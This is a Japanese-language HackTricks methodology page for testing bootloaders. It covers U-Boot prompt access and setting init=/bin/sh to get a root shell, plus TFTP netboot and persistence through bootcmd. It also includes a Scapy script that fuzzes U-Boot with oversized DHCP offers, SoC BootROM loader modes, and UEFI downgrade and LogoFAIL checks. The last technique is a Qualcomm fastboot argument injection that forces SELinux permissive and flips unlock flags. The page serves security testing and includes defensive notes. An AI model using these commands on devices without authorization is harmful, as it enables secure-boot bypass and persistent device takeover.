# Bootloader テスト

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの起動設定を変更し、U-Boot や UEFI-class loaders のようなブートローダーをテストする際に推奨されます。早期のコード実行を確保すること、署名/ロールバック保護を評価すること、リカバリや network-boot 経路の悪用に注力してください。

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 即効手法と環境の悪用

1. インタプリタシェルにアクセスする
- 起動中、`bootcmd` が実行される前に既知のブレークキー（多くは任意のキー、0、スペース、またはボード固有の「magic」シーケンス）を押して U-Boot プロンプトに落とします。

2. ブート状態と変数を調査する
- 便利なコマンド:
- `printenv` (環境をダンプ)
- `bdinfo` (ボード情報、メモリアドレス)
- `help bootm; help booti; help bootz` (サポートされるカーネルブート方法)
- `help ext4load; help fatload; help tftpboot` (利用可能なローダー)

3. ルートシェルを得るために起動引数を変更する
- カーネルが通常の init の代わりにシェルに落ちるように `init=/bin/sh` を追加します:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP サーバからの Netboot
- ネットワークを設定し、LAN からカーネル/FIT イメージを取得:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 環境経由で変更を永続化する
- env ストレージが書き込み保護されていなければ、コントロールを永続化できます:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- フォールバック経路に影響する `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` のような変数を確認してください。不適切な値はシェルへの繰り返しの侵入を許すことがあります。

6. デバッグ/安全でない機能をチェックする
- 探すべき項目: `bootdelay` > 0、`autoboot` が無効、制限のない `usb start; fatload usb 0:1 ...`、シリアル経由での `loady`/`loads` の可否、信頼されていないメディアからの `env import`、署名チェックなしで読み込まれるカーネル/ramdisk。

7. U-Boot イメージ/検証のテスト
- プラットフォームが FIT イメージで secure/verified boot を主張する場合、未署名や改変されたイメージの両方を試します:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` がない、もしくは古い `verify=n` の動作が残っていると任意のペイロードがブートできることが多いです。

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP パラメータのファジング
- U-Boot のレガシーな BOOTP/DHCP 処理はメモリ安全性の問題を抱えてきました。例として CVE‑2024‑42040 は、巧妙に作られた DHCP 応答によるメモリ情報漏えい（memory disclosure）を記述しており、U-Boot メモリからワイヤ上へバイトを leak する可能性があります。option 67 bootfile-name、vendor options、file/servername フィールドなど、過長やエッジケースの値で DHCP/PXE 経路を試験し、ハングや leak が発生するか観察してください。
- Netboot 中のブートパラメータに負荷をかける最小限の Scapy スニペット:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- また、PXE の filename フィールドが OS 側のプロビジョニングスクリプトにチェーンされたときに、サニタイズ無しでシェル/ローダーロジックに渡されるかも検証してください。

9. 悪意ある DHCP サーバによるコマンドインジェクションのテスト
- rogue DHCP/PXE サービスをセットアップし、filename やオプションフィールドに文字列を注入してブートチェーン後段のコマンド解釈器に到達できるか試します。Metasploit の DHCP auxiliary、`dnsmasq`、カスタム Scapy スクリプトが有用です。実験は必ず分離されたラボネットワークで行ってください。

## SoC ROM リカバリモード（通常のブートをオーバーライド）

多くの SoC は BootROM の「ローダ」モードを公開しており、フラッシュイメージが無効でも USB/UART 経由でコードを受け付けます。secure-boot の fuses が焼かれていない場合、これはチェーンの非常に早い段階で任意のコード実行を提供することがあります。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

デバイスに secure-boot の eFuses/OTP が焼かれているかを評価してください。焼かれていない場合、BootROM のダウンロードモードは上位の検証（U-Boot、カーネル、rootfs）を頻繁にバイパスし、SRAM/DRAM から直接最初のステージペイロードを実行します。

## UEFI/PC-class bootloaders: quick checks

10. ESP の改ざんとロールバックの検証
- EFI System Partition (ESP) をマウントしてローダコンポーネントを確認: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ベンダーロゴのパス等。
- Secure Boot の revocations (dbx) が最新でない場合、ダウングレードしたり既知の脆弱な署名済みブートコンポーネントでブートを試みてください。プラットフォームが古い shim/bootmanager をまだ信頼していれば、ESP から自分のカーネルや `grub.cfg` を読み込ませて永続化を得られることがよくあります。

11. ブートロゴ解析バグ (LogoFAIL クラス)
- 複数の OEM/IBV ファームウェアは、ブートロゴを処理する DXE の画像解析に脆弱性がありました。攻撃者がベンダー固有のパス（例: `\EFI\<vendor>\logo\*.bmp`）に細工した画像を置ける場合、Secure Boot が有効でも初期ブート中にコード実行が可能になる場合があります。プラットフォームがユーザー提供のロゴを受け入れるか、OS からそのパスが書き込み可能かどうかをテストしてください。

## Android/Qualcomm ABL + GBL (Android 16) の信頼ギャップ

Android 16 デバイスで Qualcomm の ABL が **Generic Bootloader Library (GBL)** をロードする場合、ABL が `efisp` パーティションから読み込む UEFI アプリを **認証しているか** を検証してください。ABL が単に UEFI アプリの **存在** をチェックするだけで署名検証を行わなければ、`efisp` への書き込みプリミティブはブート時の **pre-OS unsigned code execution** につながります。

実践的なチェックと悪用経路:

- **efisp write primitive**: `efisp` にカスタム UEFI アプリを書き込む手段（root/権限のあるサービス、OEM アプリのバグ、recovery/fastboot パスなど）が必要です。これがなければ GBL の読み込みギャップは直接到達できません。
- **fastboot OEM argument injection** (ABL bug): 一部のビルドは `fastboot oem set-gpu-preemption` に追加トークンを許容し、それらをカーネルコマンドラインに追加します。これにより SELinux を permissive に強制し、保護されたパーティションへの書き込みを可能にすることがあります:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
デバイスがパッチ済みであれば、コマンドは追加引数を拒否するはずです。
- **Bootloader unlock via persistent flags**: ブート段階のペイロードにより永続的なアンロックフラグ（例: `is_unlocked=1`, `is_unlocked_critical=1`）を反転させて、OEM サーバ/承認なしで `fastboot oem unlock` をエミュレートすることができます。これは次回再起動後も持続する設定変更です。

防御/トリアージの注意点:

- ABL が `efisp` からの GBL/UEFI ペイロードに対して署名検証を行っているかを確認してください。行っていない場合、`efisp` を高リスクな永続化面とみなしてください。
- ABL の fastboot OEM ハンドラが引数数を検証して追加トークンを拒否するように修正されているか追跡してください。

## ハードウェア上の注意

初期ブート中に SPI/NAND フラッシュに触れる（例: 読み取りをバイパスするためにピンをグラウンドする等）際は注意し、必ずフラッシュのデータシートを参照してください。タイミングを誤った短絡はデバイスやプログラマを破損する可能性があります。

## 注記と追加のヒント

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試して、環境ブロブを RAM とストレージ間で移動してください；一部プラットフォームは認証なしにリムーバブルメディアから env を import できます。
- extlinux.conf 経由で起動する Linux ベースのシステムで永続化を得るには、ブートパーティションの `APPEND` 行を変更して `init=/bin/sh` や `rd.break` を注入するだけで十分な場合が多いです（署名チェックがない場合）。
- ユーザランドが `fw_printenv/fw_setenv` を提供している場合、`/etc/fw_env.config` が実際の env ストレージに合っているか検証してください。誤ったオフセットは間違った MTD 領域の読み書きを許すことがあります。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
